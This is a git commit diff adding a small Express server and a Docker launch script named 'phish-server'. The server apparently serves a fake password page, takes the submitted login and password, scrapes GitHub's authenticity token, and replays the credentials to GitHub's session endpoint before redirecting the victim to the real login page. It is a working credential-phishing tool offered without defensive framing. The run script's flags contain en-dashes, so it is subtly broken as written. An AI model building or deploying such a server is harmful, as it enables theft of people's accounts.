dfa5c61f02734dc82c114d6adc4265b44f50e1c1
Michaela DeForest <mdeforest@galileosuite.com>
2023-09-19 20:45:51 -0400

    first commit

---
+++ app.js
@@ -0,0 +1,70 @@
+const express = require("express");
+const path = require("path");
+const axios = require("axios");
+const cookieParser = require("cookie-parser");
+const jsdom = require("jsdom");
+const bodyParser = require("body-parser");
+
+const app = express();
+const port = 3000;
+
+app.engine(".html", require("ejs").__express);
+
+app.set("views", path.join(__dirname, "views"));
+
+app.use(express.static(path.join(__dirname, "public")));
+
+app.use(cookieParser());
+
+app.use(bodyParser.urlencoded({ extended: true }));
+
+app.set("view engine", "html");
+
+var username = "mdeforest";
+
+app.get("/", function (req, res) {
+  res.render("index", {
+    username: username,
+  });
+});
+
+app.post("/password", async function (req, res) {
+  const instance = axios.create({
+    withCredentials: true,
+    headers: {
+      "user-agent":
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
+    },
+  });
+
+  var login_info = {
+    commit: "Sign in",
+    utf8: "%E2%9C%93",
+    login: req.body.login,
+    password: req.body.password,
+  };
+
+  var resp = await instance.get("https://github.com/session");
+  const dom = new jsdom.JSDOM(resp.data);
+  login_info["authenticity_token"] = dom.window.document
+    .querySelector("input[name='authenticity_token']")
+    .getAttribute("value");
+
+  try {
+    var resp2 = await instance.post("https://github.com/session", login_info);
+  } catch (exception) {
+    console.log("");
+  }
+
+  res.redirect("https://github.com/login");
+});
+
+app.get("/password", async function (req, res) {
+  res.render("password", {
+    username: username,
+  });
+});
+
+app.listen(port, () => {
+  console.log(`Example app listening on port ${port}`);
+});
---
+++ run.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+
+
+docker run -d -–rm -p 3000:3000 –name phish-server phish-server:latest
